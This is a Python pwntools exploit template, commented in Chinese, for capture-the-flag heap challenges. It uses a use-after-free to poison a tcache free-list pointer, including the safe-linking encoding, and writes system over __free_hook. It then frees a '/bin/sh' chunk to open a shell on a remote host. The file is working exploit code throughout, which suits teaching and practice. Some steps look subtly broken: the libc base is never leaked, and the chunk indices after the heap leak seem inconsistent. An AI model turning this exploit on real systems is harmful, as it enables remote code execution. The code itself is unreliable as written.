#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
用途: tcache poisoning 模板 —— 利用 UAF 写 tcache fd, 两次 malloc 后把 chunk 分配到任意地址写
适用条件:
    - glibc >= 2.26(tcache 存在); 菜单堆题 add/free/edit/show
    - 有 UAF / double free / free 后仍能 edit 的漏洞
    - glibc 2.32+ fd 被加密(safe-linking), 走 SAFE_LINKING=True 分支; <=2.31 写裸指针
    - glibc 2.34+ 已无 __free_hook, 请改打 FSOP: 用 templates/pwn_fsop_apple2.py
用法:
    1) 改 CONFIG 区: HOST/PORT/BINARY/LIBC/GROUP_SIZE/OFFSET_TO_HEAP
    2) 按 add/delete/edit/show 的实际交互改 menu 类各函数里的选项号与提示符
    3) 目标地址 TARGET 默认 __free_hook(<=2.33), 按需替换
"""
from pwn import *

# ==================== CONFIG: TODO 改这里 ====================
BINARY = "./pwn"            # TODO: 改这里
LIBC_PATH = "./libc.so.6"   # TODO: 改这里
HOST, PORT = "node.node3.com", 23333  # TODO: 改这里: 远程地址
SAFE_LINKING = True         # TODO: 改这里: glibc >= 2.32 为 True(fd 加密), 否则 False
GROUP_SIZE = 0x68           # TODO: 改这里: 申请的 chunk 大小(菜单里输入的 size)
TARGET_SYM = "__free_hook"  # TODO: 改这里: 覆盖目标符号(<=2.33 常用 __free_hook)
# =============================================================

context.arch = "amd64"
context.log_level = "info"
libc = ELF(LIBC_PATH, checksec=False)


def protect_fd(pos, target):
    """safe-linking fd 加密: fd = (fd 存放地址 >> 12) ^ 目标指针; 2.31- 直接明文"""
    return (pos >> 12) ^ target if SAFE_LINKING else target


class Menu:
    """菜单交互封装: 选项号/提示符按题目改"""

    def __init__(self, io):
        self.io = io

    # TODO: 改这里: 以下 4 个函数的选项号与提示符全部按题目菜单调整
    def add(self, size, content=b"a"):
        self.io.sendlineafter(b"choice:", b"1")
        self.io.sendlineafter(b"size:", str(size).encode())
        self.io.sendlineafter(b"content:", content)

    def delete(self, idx):
        self.io.sendlineafter(b"choice:", b"2")
        self.io.sendlineafter(b"index:", str(idx).encode())

    def edit(self, idx, content):
        self.io.sendlineafter(b"choice:", b"3")
        self.io.sendlineafter(b"index:", str(idx).encode())
        self.io.sendlineafter(b"content:", content)

    def show(self, idx):
        self.io.sendlineafter(b"choice:", b"4")
        self.io.sendlineafter(b"index:", str(idx).encode())
        return self.io.recvline_contains(b"content:", timeout=2)


def start():
    # TODO: 改这里: 本地调试换成 process(BINARY)
    return remote(HOST, PORT)


def leak_heap(m):
    """2.32+: 首个进 tcache 的 chunk fd = 自身地址>>12 (目标为 NULL), 由此还原堆基址"""
    m.add(GROUP_SIZE)      # chunk 0
    m.delete(0)            # free 后 fd = (addr>>12) ^ NULL
    data = m.show(0)
    leak = u64(data.split(b"content:")[1].strip().ljust(8, b"\x00"))
    heap_base = leak << 12
    log.success(f"heap base = {hex(heap_base)}")
    return heap_base


def pwn():
    io = start()
    m = Menu(io)
    heap = leak_heap(m) if SAFE_LINKING else 0
    # 第一个用户 chunk 通常在堆基址 + 0x2a0(tcache_perthread_struct 0x290 + 0x10)
    # TODO: 改这里: 用 gdb vmmap/heap 命令核对实际偏移; 2.31 以下用 fastbin 泄露或调试器直接拿
    chunk_addr = heap + 0x2a0

    # 经典 tcache poisoning: A、B 相继入 tcache, B 变链表头, UAF 改 B 的 fd 指向 TARGET
    size2chunk = (GROUP_SIZE + 8 + 0xF) & ~0xF   # 用户请求大小 -> 实际 chunk 间距
    m.add(GROUP_SIZE)      # chunk 0 -> A
    m.add(GROUP_SIZE)      # chunk 1 -> B
    m.delete(0)            # A 入 tcache
    m.delete(1)            # B 入 tcache, B->fd 加密指向 A
    # B 的存放位置地址 = chunk1 用户区地址, 用它加密 TARGET (PROTECT_PTR 用 &e->next 自身地址)
    m.edit(1, p64(protect_fd(chunk_addr + size2chunk, libc.symbols[TARGET_SYM])))

    # 两次 malloc: 第一次取回 B, 第二次直接返回 TARGET(即 __free_hook)
    m.add(GROUP_SIZE)
    m.add(GROUP_SIZE)
    # 向 __free_hook 写 system
    m.edit(2, p64(libc.symbols["system"]))

    # free 一个内容为 "/bin/sh" 的 chunk => system("/bin/sh")
    m.add(GROUP_SIZE, b"/bin/sh\x00")   # chunk 3
    m.delete(3)
    io.interactive()


if __name__ == "__main__":
    pwn()
